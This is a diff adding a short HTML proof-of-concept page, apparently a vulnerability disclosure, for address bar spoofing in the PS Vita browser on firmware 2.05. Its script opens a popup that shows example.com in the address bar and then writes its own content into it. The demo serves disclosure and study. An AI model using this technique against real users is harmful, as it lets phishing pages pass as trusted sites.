@@ -1,0 +1,19 @@
+&lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.01//EN&quot;&gt;
+&lt;html&gt;
+	&lt;head&gt;&lt;title&gt;Sony PS Vita - firmware 2.05 - address bar spoofing&lt;/title&gt;
+		&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html; charset=iso-8859-1&quot;&gt;
+		&lt;!-- Copyright 2013 David Vieira-Kurz and MajorSecurity GmbH --&gt;
+	&lt;/head&gt;
+	&lt;body&gt;&lt;h1&gt;Sony PS Vita - firmware 2.05 - address bar spoofing&lt;/h1&gt;
+	&lt;li&gt;Please click the button to run the proof of concept. &lt;button id=&quot;one&quot;&gt;Demo&lt;/button&gt;&lt;/li&gt;
+		&lt;script type=&quot;text/javascript&quot;&gt;
+			document.getElementById(&#039;one&#039;).onclick = function() {
+				myWindow=window.open(&#039;http://www.example.com/&#039;,&#039;Playstation Vita, PS Vita&#039;,&#039;width=200,height=100,location=yes&#039;);
+				myWindow.document.write(&quot;&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;b&gt;This page is still being hosted on majorsecurity.com, but the address bar is pointing to another domain.&lt;/b&gt;&lt;br&gt;&lt;br&gt;&lt;iframe src=\&quot;http://de.playstation.com/psvita/\&quot;);&gt;&lt;/iframe&gt;&lt;/scri+pt&gt;&lt;/body&gt;&lt;/html&gt;&quot;);
+				myWindow.focus();
+			  return false;
+			}
+		&lt;/script&gt;
+	&lt;/body&gt;
+&lt;/html&gt;
+
